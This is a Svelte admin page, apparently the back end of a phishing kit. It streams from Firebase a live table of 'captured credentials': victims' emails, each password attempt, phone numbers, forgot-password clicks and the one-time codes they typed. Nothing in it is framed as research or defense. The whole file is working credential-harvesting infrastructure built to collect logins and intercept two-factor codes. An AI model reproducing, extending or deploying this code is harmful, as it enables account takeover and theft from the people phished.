<script>
	import { db } from '$lib/firebase';
	import { ref, onValue } from 'firebase/database';
	import { onMount } from 'svelte';

	let sessions = $state([]);
	let loading = $state(true);

	onMount(() => {
		const sessionsRef = ref(db, 'sessions');
		const unsubscribe = onValue(sessionsRef, (snapshot) => {
			loading = false;
			const data = snapshot.val();
			if (data) {
				// Convert object to array and sort by timestamp descending
				sessions = Object.entries(data)
					.map(([id, val]) => ({ id, ...val }))
					.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
			} else {
				sessions = [];
			}
		});

		return () => {
			unsubscribe();
		};
	});
</script>

<svelte:head>
	<title>Live Credentials Tracker | Admin</title>
</svelte:head>

<div class="min-h-screen bg-gray-50 p-8 font-figtree">
	<div class="mx-auto max-w-7xl">
		<div class="mb-8 flex items-center justify-between">
			<div>
				<h1 class="text-3xl font-bold text-gray-900">Authentication Logs</h1>
				<p class="mt-2 text-sm text-gray-600">Real-time tracker of all captured credentials</p>
			</div>
			<div class="flex items-center gap-2 rounded-full bg-green-50 px-3 py-1 ring-1 ring-inset ring-green-600/20">
				<span class="relative flex h-2 w-2">
				  <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-green-400 opacity-75"></span>
				  <span class="relative inline-flex h-2 w-2 rounded-full bg-green-500"></span>
				</span>
				<span class="text-xs font-medium text-green-700">Live Updates Connected</span>
			</div>
		</div>

		<div class="overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
			{#if loading}
				<div class="flex h-64 items-center justify-center">
					<div class="h-8 w-8 animate-spin rounded-full border-4 border-gray-200 border-t-brand-blue-500"></div>
				</div>
			{:else}
				<div class="overflow-x-auto">
					<table class="min-w-full divide-y divide-gray-200 text-left text-sm">
						<thead class="bg-gray-50">
							<tr>
								<th class="px-6 py-4 font-semibold text-gray-900">Time</th>
								<th class="px-6 py-4 font-semibold text-gray-900">Email</th>
								<th class="px-6 py-4 font-semibold text-gray-900">Passwords Attempted</th>
								<th class="px-6 py-4 font-semibold text-gray-900">Phone</th>
								<th class="px-6 py-4 font-semibold text-gray-900">Forgot Pwd?</th>
								<th class="px-6 py-4 font-semibold text-gray-900">OTP Attempts</th>
							</tr>
						</thead>
						<tbody class="divide-y divide-gray-200 bg-white">
							{#each sessions as session (session.id)}
								<tr class="transition-colors hover:bg-gray-50">
									<td class="whitespace-nowrap px-6 py-4 text-gray-500">
										{session.timestamp ? new Date(session.timestamp).toLocaleTimeString() : '—'} <br/>
										<span class="text-xs">{session.timestamp ? new Date(session.timestamp).toLocaleDateString() : ''}</span>
									</td>
									<td class="px-6 py-4 font-medium text-gray-900">
										{session.email || '—'}
									</td>
									<td class="px-6 py-4">
										{#if session.passwords}
											<div class="flex flex-col gap-1">
												{#each Object.values(session.passwords) as pwd, i}
													<span class="inline-flex w-fit items-center rounded-md bg-red-50 px-2 py-1 text-xs font-medium text-red-700 ring-1 ring-inset ring-red-600/10">
														Attempt {i + 1}: {pwd}
													</span>
												{/each}
											</div>
										{:else}
											<span class="text-gray-400">—</span>
										{/if}
									</td>
									<td class="whitespace-nowrap px-6 py-4 text-gray-900">
										{session.phone || '—'}
									</td>
									<td class="whitespace-nowrap px-6 py-4 text-gray-900">
										{#if session.forgotPasswordClicked}
											<span class="inline-flex items-center rounded-md bg-yellow-50 px-2 py-1 text-xs font-medium text-yellow-800 ring-1 ring-inset ring-yellow-600/20">Yes</span>
										{:else}
											<span class="text-gray-400">No</span>
										{/if}
									</td>
									<td class="px-6 py-4">
										{#if session.otps}
											<div class="flex flex-col gap-1">
												{#each Object.values(session.otps) as code, i}
													<span class="inline-flex w-fit items-center rounded-md bg-brand-blue-50 px-2 py-1 text-xs font-mono font-medium text-brand-blue-700 ring-1 ring-inset ring-brand-blue-600/20">
														Attempt {i + 1}: {code}
													</span>
												{/each}
											</div>
										{:else}
											<span class="text-gray-400">—</span>
										{/if}
									</td>
								</tr>
							{/each}
							{#if sessions.length === 0}
								<tr>
									<td colspan="5" class="px-6 py-12 text-center text-gray-500">
										No records found. Data will appear here when users attempt to log in.
									</td>
								</tr>
							{/if}
						</tbody>
					</table>
				</div>
			{/if}
		</div>
	</div>
</div>
